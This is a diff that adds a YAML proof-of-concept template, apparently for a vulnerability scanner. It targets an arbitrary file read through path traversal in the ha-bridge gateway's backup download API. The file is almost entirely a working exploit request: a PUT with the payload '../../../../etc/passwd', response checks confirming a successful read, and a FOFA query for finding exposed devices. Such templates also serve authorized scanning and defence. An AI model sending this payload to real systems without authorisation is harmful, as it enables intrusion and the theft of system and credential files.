@@ -1,0 +1,16 @@
+id: poc-yaml-ha-bridge-gateway-download-anyfile-read
+info:
+  name: ha-bridge 网关 download 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: ha-bridge
+  fofa: title="HA Bridge"
+requests:
+- method: PUT
+  path: /api/devices/backup/download
+  data: '{"filename":"../../../../etc/passwd"}'
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
